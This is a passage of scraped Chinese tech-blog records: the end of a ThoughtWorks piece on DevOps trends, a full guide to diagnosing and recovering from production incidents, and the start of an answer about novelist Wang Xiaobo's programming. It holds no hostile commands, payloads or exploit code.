href=\"https://www.thoughtworks.com/radar/techniques/legacy-in-a-box\">封装遗留系统</a>这样的实践，它往往配合着Vagrant，Packer和Docker这样的工具一起使用。一方面它将技术债务的风险进行了隔离，另一方面它防止了遗留系统上产生的技术债利息的增长。</p>\n<h3>趋势6：安全成为推动DevOps全面发展的重要力量</h3>\n<p>安全是DevOps永远绕不开的话题，也往往是新技术在传统行业（例如金融和电信）应用中的最大阻碍。一方面，组织结构的转型迫使企业要打破原先的部门墙，这意味着很多原先的控制流程不再适用。另一方面，由于大量的DevOps技术来源于开源社区，缺乏强大技术实力的企业在应用相关技术时不免会有所担忧。</p>\n<p>从代码中解耦秘密信息的管理则让我们避开了一些开发过程中可能会产生的安全隐患。采用<a href=\"https://github.com/AGWA/git-crypt\">git-crypt</a>这样的工具可以帮我们保证在开发的过程中源代码内部的信息安全。而采用<a href=\"https://www.vaultproject.io/\">HashiCorp Vault</a>则提供了脱离应用程序代码的秘密信息存储机制，使得应用在运行过程中的秘密得到了有效保护。</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/04/7-HashiCorp-Vault-1.jpg\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/04/7-HashiCorp-Vault-1-1024x742.jpg\" alt=\"\" width=\"700\" height=\"507\"></a></p>\n<p>Linux Security Module则一直在技术雷达的“采用”区域，通过SELinux和AppArmor这样的LSM兼容帮助团队评估谁可以访问共享主机上的哪些资源(包括其中 的服务)。这种保守的访问管理方法将帮助团队在其SDLC流程中建立更好的安全性。以往这是Ops团队需要考虑的问题，而对DevOps的团队来说，这是每一个人的事情。</p>\n<p>“合规性即代码”（Compliance as Code）是继“基础设施即代码”，“流水线即代码”之后的又一种自动化尝试。<a href=\"https://github.com/chef/inspec\">InSpec</a>作为合规性即代码的提出者和实现者，通过自动化手段确保服务器在部署后的运维生命周期中依然保持安全与合规。它所带来的意义在于将规范制度代码化，得到了确定性的结果和解释。</p>\n<p>在不远的将来，不难想象人们所面对的法律和法规规定不再是一堆会导致歧义的语言文字条目，而是一组由自动化测试构成的测试环境。</p>\n<p>安全性和易用性往往被认为是鱼与熊掌不可兼得的两个方面。在DevOps之前，团队吞吐量和系统稳定性指标曾经也面临这样的境遇，然而DevOps使得二者可以兼得。同样我也有信心看到在未来DevOps的领域里，更多易用且安全的工具将会不断出现。在降低DevOps所带来的安全风险的同时，也提升团队开发过程的顺畅性和用户便利性。</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/04/8-InSpec.jpg\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/04/8-InSpec-1024x611.jpg\" alt=\"\" width=\"700\" height=\"418\"></a></p>\n<h3>趋势7：Windows Server和.NET平台下的DevOps技术潜力巨大</h3>\n<p>长期以来，Windows和.NET平台下的DevOps一直都是一个被低估的领域。一方面，社区缺乏对 Windows Server平台的兴趣。另一方面，<a href=\"https://community.spiceworks.com/networking/articles/2462-server-virtualization-and-os-trends\">Windows Server却有接近90%的市场占用率</a>，在Web服务器领域则有<a href=\"https://w3techs.com/technologies/overview/operating_system/all\">33.5%的市场占有率</a>。</p>\n<p>有充足理由证明这是一个潜力巨大的市场。 我们看到了<a href=\"https://www.thoughtworks.com/radar/tools/cake-and-fake\">CAKE和FAKE</a>这样的条目，作为.NET平台下替代MSBuild的构建解决方案， 它增强了.NET平台自动化方面的能力。而<a href=\"https://github.com/HangfireIO/Hangfire\">HANGFIRE</a>则提供了更易用和灵活的自动化进程调度框架。我很期待未来有更多Windows Server和.NET平台领域的创新。不久前，Docker已经可以在Windows下运行。可以预见到，Windows Server和.NET平台将会是下一阶段DevOps技术实践中值得深入发掘的领域。</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/04/9-.NET_.png\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/04/9-.NET_.png\" alt=\"\" width=\"888\" height=\"289\"></a></p>\n<h3>趋势8：非功能性自动化测试工具的逐渐完备</h3>\n<p>自动化测试水平往往是衡量DevOps技术能力高低的重要指标，尤其是针对生产环境应用程序的非功能性自动化测试工具。一直以来，技术雷达都在尝试从不同的角度宣扬自动化测试的重要性，从软件的开发阶段延展到了整个应用生命周期甚至整体IT资产的管理上。</p>\n<p>这期的技术雷达仍然关注了非功能性自动化测试，<a href=\"https://github.com/philpep/testinfra\">TestInfra</a>是ServerSpec的Python实现，它使得用Pytest测试基础设施成为可能。而<a href=\"https://github.com/metacloud/molecule\">MOLECULE</a>旨在帮助开发和测试Ansible的Role 。通过在虚拟机或容器上为正在运行的Ansible Role测试构建脚手架，无需再手工创建这些测试环境。正如技术雷达所说的：“虽然这是一个相当年轻的项目，但我们看到了其蕴含的巨大潜力。”</p>\n<h3>趋势9：Python成为DevOps工作中所不可或缺的语言</h3>\n<p>早在DevOps刚刚开始盛行的时候，Python就是一个被寄予厚望的语言，因为大部分DevOps工具和实践都需要用到Python。虽然也有人尝试用Ruby或者NodeJS构建DevOps工具，然而都没有Python所构建的工具流行。与此同时，仍然不断有人把其它语言下编写的工具转化为Python的版本，TestInfra就是这样一个例子。</p>\n<p>随着Python在大数据、人工智能、区块链、微服务以及Docker中的发展，可以预见Python在日后的领域仍然会发挥重要的作用。</p>\n<p>以上对DevOps趋势的解读仅为个人观点，如有不当之处还望指出。关于更多技术在技术雷达中的使用建议请参考<a href=\"https://www.thoughtworks.com/radar/a-z\">这里</a>，谢谢。</p>\n<div></div>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111064\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111064votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111064\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina\">ThoughtWorks</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina\">\r\n\t\t\t<img src=\"http://tp3.sinaimg.cn/1774908135/180/0/1\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            ThoughtWorks是一家全球IT咨询公司，追求卓越软件质量，致力于科技驱动商业变革。擅长构建定制化软件产品，帮助客户快速将概念转化为价值。同时为客户提供用户体验设计、技术战略咨询、组织转型等咨询服务。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/thoughtworkschina\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/thoughtworkschina/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 60</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://insights.thoughtworkers.org/\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/thoughtworkschina\"><i class=\"fa fa-weibo\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://insights.thoughtworkers.org/wp-content/uploads/2017/04/1-DevOps-1024x426.jpg"], "fav_nums": 1, "comment_nums": 0, "create_date": "2017/05/03", "praise_nums": 1}
{"tags": "IT技术,运维", "front_image_path": "full/61e83f8220685c9a81e1f9e49c9a8861761868e5.jpg", "title": "如何快速处理线上故障", "url_object_id": "3bcbe2f9d07532bfa45a871a1cd09143", "url": "http://blog.jobbole.com/111081/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/daoqidelv/p/6785372.html\">倒骑的驴</a>   </div><h3>概述</h3>\n<p>线上故障通常是指大规模的影响线上服务可用性的问题或者事件，通俗点讲就是：掉‘坑’里了，这个‘坑’就是线上故障！线上故障的处理过程可以形象地表达为：‘踩坑’、‘跳坑’、‘填坑’、‘避坑’。</p>\n<p>线上故障的处理不仅是一项技术活，更是对技术人员/技术团队反应能力、决策能力、判定能力、组织能力的考验。面对突发的生产故障，需要快速定位问题，找到解决方案，快速实施解决方案并不是一件容易的事情。本文主要包括如下内容：线上故障处理的目标、思路、步骤、基础设施。</p>\n<p>本文是依据平时经历的生产故障排查和处理，总结一些肤浅的方法论，以求共同探讨，共同提高，欢迎探讨。</p>\n<h3>线上故障处理的目标</h3>\n<p>任何动物一旦掉进坑里，明智的做法一定是：跳坑–&gt;填坑–&gt;避坑，线上故障处理的过程也一样，优先级从高到低，线上故障处理的目标如下：</p>\n<h4>跳坑</h4>\n<p>‘跳坑’——快速恢复线上服务，或者将对线上服务的影响降到最低。</p>\n<p>线上服务的可用性决定着服务者的客户利益，影响着公司的收益。一旦线上环境不可用，无法服务用户，给公司/团队带来经济利益损失的同时，更为严重的会给公司/团队带来恶劣的名声。所以一般公司都会对线上环境提出稳定性和可靠性的要求，这也是团队乃至部门的kpi。为此，遇到生产故障后的第一要务是：恢复生产服务，即使不能完全恢复线上服务，也要想尽办法将对线上服务的影响降到最低。</p>\n<h4>填坑</h4>\n<p>‘填坑’——找到问题原因，根本上解决问题。</p>\n<p>在恢复线上服务，尽最大限度减掉对用户/公司/团队带来的影响后，我们需要彻查问题，搞清楚故障发生的根本原因，从根本上解决问题。通常情况下，‘填坑’和‘跳坑’是同步在做的，完成‘填坑’也就意味中‘跳坑’成功，但是也有一些紧急情况下的特别‘跳坑’方法，比如重启服务，或者服务降级/熔断等等，实际并未在当时完成‘填坑’，而是先采取非常规手段‘跳坑’，之后再慢慢‘填坑’。</p>\n<h4>避坑</h4>\n<p>‘避坑’——举一反三，消灭隐患。</p>\n<p>找到了根本原因，解决了问题之后，我们需要举一反三，以此及彼，想想在这个故障排查和处理过程中，那些环节存在弱点？那些流程/规范/制度需要优化？这类问题是否在其他系统或者团队中也存在？通过这样的反思和自我批评，形成一份线上事故报告，不断完善流程，避免再次踩坑，也在团队中交流经验，共同提高。</p>\n<h3>线上故障处理的思路</h3>\n<p>依据线上故障处理的目标及目标的优先级，线上排障的第一目标是恢复线上服务或者降低对线上服务的影响，关键点在于快速二字，在‘跳坑’-‘填坑’之后，再行回溯总结，以便‘避坑’。因此，可以将线上故障处理的步骤分为：</p>\n<ol>\n<li>故障发现</li>\n<li>故障定位</li>\n<li>故障排除</li>\n<li>故障回溯</li>\n</ol>\n<p>其中前三步是‘跳坑’行为，后面一步包含了‘填坑’和‘避坑’。</p>\n<p>上述步骤并不是说要从上到下顺序进行，建议<strong>在不乱阵脚的情况下，并行去做</strong>，因为通常线上故障后会紧急启动故障处理程序，运维、开发、测试、产品各个角色都会参与进来，这时候分工下去，并行去做，不断汇总消息，做出判断，以求快速排障，恢复服务。<strong>这个思路类似于操作系统的fork/join设计思想，目的在于提高效率</strong>。</p>\n<p>在无法快速找到故障原因的时候，需要果断跳过故障定位环节，直接进行故障排除，比如采用服务降级、服务器扩容等手段，确保对线上服务降到最低且可控。等到线上服务’撑’过去之后，我们再慢慢定位故障原因，根本上解决问题。</p>\n<p>下面我们会对这四个步骤进行详细说明。</p>\n<h3>故障发现</h3>\n<p>线上故障一般可以通过如下几种途径传递到开发/运维人员手中，按照从上到下的顺序，故障的严重程度依次变高。</p>\n<ul>\n<li>主动发现——可能是开发或者运维不经意间查看生产环境的error日志，或者例行检查监控项时，看到了一些异常的现象，进而发现了故障；</li>\n<li>系统监控告警——通常包括cpu、内存、io、tcp连接数、disk、线程数、GC、连接池等各个服务器指标异常，可能是服务器出现了异常，但是业务还未受到大面积影响；</li>\n<li>业务监控告警——如用户登录失败率增加，订单堆积量增大，则意味中系统的异常已经很严重，影响了业务处理；</li>\n<li>关联系统故障追溯——上游系统或者下游系统的故障处理邮件/电话追溯，可能和本系统有关系，而且情况已经变得很糟糕了，需要快速定位；</li>\n<li>生产事件上报——通常业务异常带来的影响传递到用户，再从用户传递到客服人员，再到技术人员手里，会存在一定时延，所以一旦有生产事件上报，这个时候严重性已经到了最高，技术人员的压力也会增大，因为会有领导的关注，产品经理的询问和催促，客户人员的焦虑带来的压力。</li>\n</ul>\n<p>上述途径传递过来的信息仅仅只是线上故障苗头，并非一定就发生了大规模的线上故障，所以首先需要确认的是这是不是一次线上故障？还是只是个例生产问题？是否和本系统有关系？一般来讲：‘<strong>系统监控告警</strong>’和‘<strong>业务监控告警</strong>’的情况下，大部分都和本系统有关，且可能是线上故障；而‘主动发现’和‘生产事件上报’则需要做甄别，可以根据上报事件个数或者问题复现的方式来评估是否是大规模线上故障，或者跟踪日志信息或者特定用户问题追溯来确定。至于‘<strong>关联系统故障追溯</strong>’的情况，首先不要慌，先从宏观上确定本系统服务正常，一般可以检查是否有服务器监控报警，是否有业务监控报警等来确定，如果上游或者下游提供了日志，可以通过日志进行追踪，从而确定本系统是否存在故障。</p>\n<p>因此在得到一些线上故障苗头之后，可以通过以下途径确定是否是线上故障：业务监控告警、上报事件个数、问题重现、服务器监控等。<strong>这些途径可以并行进行，灵活组合，有时候一个手段就能确定，有时候需要组合多个手段予以判定</strong>。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/05/3ab27a1c2ffd9bfc14defd2e824de301.png\"><img class=\"alignnone size-full wp-image-111082\" src=\"http://jbcdn2.b0.upaiyun.com/2017/05/3ab27a1c2ffd9bfc14defd2e824de301.png\" alt=\"1\"></a></p>\n<h3>故障定位</h3>\n<p>一旦确定是线上故障后，我们需要快速定位故障点，找到问题原因，以便对症下药，快速排除故障。</p>\n<p>故障定位是一个不断‘收集信息–假设–验证–尝试’的循环过程，基本思路：拿到线上信息，产生怀疑点，拿到更详细的信息，进行推理验证，必要时刻，找到可行的验证措施，进行可控的尝试，或者在测试环境进行业务测试重现，性能测试重现。</p>\n<p>可能存在的怀疑点有：</p>\n<ul>\n<li>新版本发布有问题</li>\n<li>潜在的程序bug被激发，比如在访问量暴增的情况下，并发bug被激发</li>\n<li>业务量暴涨</li>\n<li>遭遇攻击，如活动期间羊毛党刷积分等</li>\n<li>上游服务调用异常，如上游系统升级httpclient后，将长连接改为短连接</li>\n<li>下游服务异常，下游服务宕机</li>\n<li>网络问题</li>\n<li>服务器故障，如磁盘满，内存爆掉等</li>\n<li>应用故障</li>\n<li>数据库故障</li>\n</ul>\n<p>为此，可以通过如下几方面收集信息，以便支撑你的怀疑点：</p>\n<ul>\n<li>最近新版本的发布情况</li>\n<li>本服务的异常/error日志</li>\n<li>本服务的调用量变化情况，是否存在暴涨？</li>\n<li>本服务的吞吐量，是否出现下降？</li>\n<li>本服务的时延，是否出现突然增大？</li>\n<li>服务器TCP的链接情况，是否存在大量的CLOSE_WAIT？</li>\n<li>服务器的cpu使用率，是否突然飙升？</li>\n<li>服务器的disk，磁盘空间是否已经用完？</li>\n<li>服务器的内存，内存是否爆掉？</li>\n<li>数据库或者存储是否挂掉？</li>\n</ul>\n<p>很多故障并不是由于单一原因造成的，而是多个条件同时满足时才出现的，所以，需要多收集信息，综合得到的信息，产生怀疑点，快速推理和验证，最后找到问题点，定位到故障。这个过程中可以集合大家的力量，并行去check各个点，并快速反馈信息。</p>\n<p>由于组合情况众多，这里只将明显的故障定位场景列出，更多的需要总结归纳：</p>\n<ul>\n<li>发布了最新版本，且故障最早出现时间在版本发布之后，很大程度上时由于新版本发布带来的问题，可能是bug，也可能是部署出现问题；</li>\n<li>未发布新版本，业务访问量猛增，服务时延增大，吞吐量先上升后下降，到最后服务直接不可用，可能原因是：业务量暴涨/遭遇攻击/上游服务异常调用；</li>\n<li>未发布新版本，部分服务失败，服务错误率增加，业务访问量增加，可能原因是业务访问量增大激发了潜在的并发bug，或者出现了io瓶颈等；</li>\n<li>业务访问量并未增加，但是服务时延下降，吞吐量下降，服务错误率增加，且服务器TCP的CLOSE_WAIT增大，这时候需要怀疑下游依赖服务是否异常。</li>\n<li>业务访问量并未增加，服务大范围不可用，日志中出现大量数据库错，很明显数据库可能出现问题，或者应用的数据库连接池出现问题。</li>\n</ul>\n<p>不一而足，需要逐步积累。下图是对上面描述的总结。</p>\n<p style=\"text-align: center\"><a href=\"http://jbcdn2.b0.upaiyun.com/2017/05/bc642fb22060a447b8d45506991e1120.png\"><img class=\"alignnone size-full wp-image-111083\" src=\"http://jbcdn2.b0.upaiyun.com/2017/05/bc642fb22060a447b8d45506991e1120.png\" alt=\"1\"></a></p>\n<p>故障定位的初期，一般会先通过邮件+电话的方式进行沟通，如果几分钟之后事态变糟糕，且没有眉目，则需要紧急启动会议形式的联合排障，所有相关人员需要放下手头事情，集中到一个特定会议室进行联合排障。这样的好处也在于能够迅速共享信息，快速做出决策。联合排障人员通常会包括：开发、运维、测试、产品，主力应当是开发和运维，测试和产品需要帮忙快速确认一些东西，如复现问题，或者确认业务逻辑等。</p>\n<p>从上面可以看到，故障定位过程中，追求‘快速’二字，为此多项事情是并行去做的。为了避免出现群龙无首的慌乱局面，需要有一个主心骨坐镇，把握排障的方向并最终做出决策，这个人是master，需要冷静沉着，且要能调度尽可能多的资源，所以技术leader或者运维leader会比较合适。这个类似于分布式系统的设计思路。</p>\n<p>另外，在故障定位过程中，获得的线上一线信息需要通过某种形式记录下来，邮件往来是一种比较好的方式，在完成通信和信息共享的基础上，也无形中保留了现场。其他的信息包括：error log，dump文件，服务器各个指标的状态值等等。</p>\n<h3>故障排除</h3>\n<p>一旦定位到故障原因，对症下药地排除故障就不是什么难事了，具体的措施可以参考下图中的总结：</p>\n<p style=\"text-align: center\"><a href=\"http://jbcdn2.b0.upaiyun.com/2017/05/156a5fe139f4bed28cac290f01277592.png\"><img class=\"alignnone size-full wp-image-111084\" src=\"http://jbcdn2.b0.upaiyun.com/2017/05/156a5fe139f4bed28cac290f01277592.png\" alt=\"1\"></a></p>\n<p>这里需要特别指出一个特别的场景：无法定位故障的情况下如何迅速排除故障。</p>\n<p>很多时候无法及时找到故障原因，必须直接进入故障排除，这时候的思路就在于：尽最大可能降低线上服务影响了。可以采用的手段有如下几项:</p>\n<ul>\n<li>服务降级——定位到某些服务有异常，但不清楚异常出现的原因，直接将这些服务降级，确保其他服务不受影响；</li>\n<li>服务紧急扩容——无法定位到是哪些服务造成的，服务器资源彪升，扛不住压力时，紧急扩容服务器；比如恶意攻击、营销活动，秒杀等场景带来的突发情况；</li>\n<li>回退版本——有新版本发布，但是不能迅速确定是否和新版本有关系，先做版本回退，确保线上服务回到上一个稳定版本。</li>\n</ul>\n<p>还是那句话，故障排除的原则是：确保线上服务快速恢复，不能完全恢复的情况下，确保线上服务尽可能少地受到影响。</p>\n<h3>故障回溯</h3>\n<p>故障回溯的目的是在故障排除后，冷静地回溯整个线上故障的发现/定位/排除过程，找出流程中/架构中/制度中的缺陷，并将该缺陷消灭掉，同时推而广之到其他系统。在‘跳坑’–‘填坑’之后，我们需要通过故障回溯的过程达到‘避坑’的效果，即要保证自己能‘避坑’，也保证团队/公司能够避开类似的坑。</p>\n<p>故障回溯的过程，因人因团队而异，最重要的是要有严肃的‘形式’和最终的产出物。之所以提到严肃的‘形式’，是因为线上故障无小事，一定要让大家牢记在心。</p>\n<p>至于如何达到‘严肃’，可以参考如下形式：</p>\n<ul>\n<li>可以和kpi挂钩。慎用，可能会伤害到技术人员的心，造成‘懒政’现象——“多干多出事，少干少出事”出现；</li>\n<li>可以实施追责制度。同上；</li>\n<li>还可以进行邮件或者会议形式的讨论，广而告之。</li>\n</ul>\n<p>总之，故障回溯的最终的目标不是为了追责，更重要的是让大家长记性，避免后续再次踩坑，而且线上故障报告的产出物一定要有，一方面是经验的积累，便于分享，另一方面也让当事人撸清楚事件过程，吃一堑长一智。</p>\n<p>可以参考的一个流程如下：</p>\n<p style=\"text-align: center\"><a href=\"http://jbcdn2.b0.upaiyun.com/2017/05/a3208d6d159864ec984e0b1da271db73.png\"><img class=\"alignnone size-full wp-image-111085\" src=\"http://jbcdn2.b0.upaiyun.com/2017/05/a3208d6d159864ec984e0b1da271db73.png\" alt=\"1\"></a></p>\n<h3>线上故障处理的‘后勤保障’</h3>\n<p>前面谈了线上故障处理的目标、思路和步骤，回过头来看下，要快速准确地定位和排除线上故障，需要很多基础设施支撑，它们是线上故障处理的‘后勤保障’。结合上面的内容归纳总结如下：</p>\n<h4>完善的监控/告警体系</h4>\n<p>通过告警，能让我们迅速知道自己的服务出了问题，通过监控可以从时间维度进行对比分析，找到可疑点，进而定位故障。</p>\n<p>监控通常分为：</p>\n<ul>\n<li>服务器监控——针对操作系统资源使用情况(比如cpu使用率、内容使用率、磁盘空间、io、network等)，容器健康程度（内存使用情况、线程数、GC情况等），application健康程度的（服务的可访问性等）;</li>\n<li>服务监控——包括吞吐量、时延等，这些指标至少包括：最大值、平均值，通过这些指标可以判断单个服务的变化情况和健康程度；</li>\n<li>业务监控——包括访问量、错误率等，一个业务场景往往会包含多个服务调用，因此通过业务监控，可以发现一些关联问题。</li>\n</ul>\n<p>告警方面，需要根据实际情况和业务场景进行阈值设定，告警阈值的设定是一个动态调整的过程。</p>\n<p>监控系统最基本的需要保证：按照时间序列进行统计、对比。</p>\n<h4>完善的日志trace体系</h4>\n<p>在线上故障处理过程中，日志尤其重要，通过日志能够定位到问题或者bug细节。在分布式架构的系统中，多实例的部署导致日志分散在多台机器上，靠人肉查看耗时费力，效率低下；另一方面，业务发展壮大后，业务系统越来越多，系统间依赖越来越多，各个业务系统的日志需要通过唯一的标识串联起来，否则会出现信息断层的问题，日志变得无用。所以完善的日志trace系统非常必要。</p>\n<p>日志trace体系的几个关键点：</p>\n<ul>\n<li>有唯一的标识串联上下游系统日志</li>\n<li>能自动收集分布式应用日志</li>\n<li>日志收集时延不能超过10分钟（具体时间试实际情况而定，如果时延太长，日志没有多大意义）</li>\n<li>支持多种形式的查询/过滤/统计等</li>\n<li>可以看到时间序列上的变化趋势</li>\n</ul>\n<p>推荐使用开源的日志架构：logstash+elasticsearch+kibana。</p>\n<h4>完善的故障处理机制</h4>\n<p>线上故障处理的要点在于快速，所以需要有完善便捷的事件流转机制和故障处理机制来保证：生产事件能快速推送到相关责任人进行联合排除，保证事件排查过程中快速共享信息，快速完成决策。</p>\n<p>对于事件上报，一般的公司会有专用的通道给到一线客服人员，客户人员填报工单，上报事件，关键点在于事件处理中担任‘路由’角色的人员，他需要对业务系统比较熟悉，对于上报的问题能快速确定相关的业务系统和负责人，并通知到对方，这个角色既要熟知业务，也要熟知系统架构和组织架构，这个角色一般会交由专门人员处理，称之为‘二线’人员，或者由运维人员兼职。</p>\n<p>排查生产事件/故障时，推荐进行集中版本，便于快速共享信息，同时需要有一个master，以便把握大的方向，并快速完成决策。</p>\n<h3>总结</h3>\n<p>以上，对线上故障处理的目标、思路、步骤及基础设施进行了讨论，先总结如下：</p>\n<ul>\n<li>线上排障的第一目标是恢复线上服务或者降低对线上服务的影响，关键点在于快速二字，在‘跳坑’-‘填坑’之后，需要总结以便‘避坑’。</li>\n<li>一切的流程或者手段都是为‘快速’二字服务的，所以线上故障是最高优先级的任务，任何人需要第一时间予以响应；同时，尽早地反馈故障问题，尽早地集结各个角色，群策群力地进行排障值得提倡；这个过程中，需要有一位有‘威望’的master坐镇，主持大局；在保证有序推进的情况下，尽可能地并行地收集信息，进行尝试。这个有点分布式架构的味道了，master坐镇，slave并行干活，提高效率。</li>\n<li>必须要有一个‘严肃’的形式让当事人及旁观者‘吃一堑长一智’，线上故障处理报告是必须的产出物。</li>\n<li>为了更加高效的处理线上故障，需要有完善的基础设施支撑：监控/告警体系、日志trace体系、事件流转机制。</li>\n</ul>\n<p>对于线上排障的流程整理了一个大图，如下：</p>\n<p style=\"text-align: center\"><a href=\"http://jbcdn2.b0.upaiyun.com/2017/05/c4fd3a0b730cc16c2b83e9e44882bc53.png\"><img class=\"alignnone size-full wp-image-111086\" src=\"http://jbcdn2.b0.upaiyun.com/2017/05/c4fd3a0b730cc16c2b83e9e44882bc53.png\" alt=\"1\"></a></p>\n<h3>案例</h3>\n<p><a href=\"http://www.cnblogs.com/daoqidelv/p/6786649.html\">线上故障处理——大量异常堆栈日志输出影响服务可用性</a></p>\n<h3>参考资料</h3>\n<p>本文中部分观点来源于goole出版的《Google SRE》一书，这本书中有很多实用的且经过实践证明了的详尽的例子，该书的读书笔记可参考：《<a href=\"http://www.jianshu.com/p/60cb877d9409\">Google SRE读后感</a>》</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111081\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111081votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111081\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 7 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/3ab27a1c2ffd9bfc14defd2e824de301.png"], "fav_nums": 7, "comment_nums": 0, "create_date": "2017/05/04", "praise_nums": 1}
{"tags": " 5 评论 ,其他,程序员,王小波", "front_image_path": "full/25e070e6d5acdf03cbdd25343e56d7835c47180a.jpg", "title": "王小波的计算机水平到底有多好？", "url_object_id": "e3525267bb91df771d7028ccd634fe54", "url": "http://blog.jobbole.com/111016/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.zhihu.com/question/20964366\">知乎</a>   </div><p>导读：有网友在知乎上提问：</p>\n<blockquote><p>王小波的计算机水平到底有多好，在王小波自己的小说中，王小波非常骄傲地说，写书的软件都是自己编写的，王小波是自学的还是教的？都会什么语言？谢谢各位！！</p></blockquote>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2014/08/93007774df953a3c852610443251c7f1.jpg\" width=\"450\" height=\"282\"></p>\n<h3>下面是<a href=\"https://www.zhihu.com/question/20964366/answer/95202867\" target=\"_blank\">王小波外甥姚勇（知名ID：王书）所写</a>，伯乐在线已获授权</h3>\n<p>以下文字都是我本人写的。为了让阅读方便，减少模糊性。我在文中以第三人视角描述。 而不用“我舅舅“，”我姥姥“，”我大舅舅“，”我小舅舅“之类的称呼。 这是一个十几年软件工程师的习惯而已。</p>\n<p>我舅舅是王小波。我是个禁不住人肉的老百姓。资质平庸。 王小波一篇《我是怎样做青年思想工作》的杂文在我青年单身适龄的年代，给我个人做了最大程度的广告。算是他老人家留给我最宝贵的遗产之一。 除此之外，还有他那台用了很久的 PC，在他去世前一年送了我。</p>\n<p>他是汇编高手。自己用汇编写了DOS下的汉字输入法。输入法有个功能，可以加 4 声。 一般拼音输入法没有这功能。这需要普通话读音正确的使用者。90年代总共也没几种汉字输入法。看过他用自己输入法打汉字。速度几乎和盲打英文一样。那时候我大学，正在疯狂苦练吉他。并没有弄懂他用了何种技术。虽然我从小学也用 Z80 和 APPLE II 做些机器码编程做游戏。但到了中学为了高考，计算机就荒废了。</p>\n<p>他人生最后几年，WINDOWS 3.2开始普及。然后是 Win95。 他开始从 DOS 转向 WIN32 SDK 编程。最终非常任性地熬夜苦干了很长时间，把输入法转为 WIN32 SDK 在 WINDOWS下正常工作。当时 WINDOWS 已经有不少汉字输入法。 尤其到了 WIN95 时代。 他这么做也只是出于兴趣，而不是在 DOS 时代的必须。就 WIN32 SDK 我们还讨论过一些。那时候WIN32 SDK 真的是很难用。主要是互联网还没有（我是 96 年后用上的），资料很少。匈牙利命名法陌生。WIN32 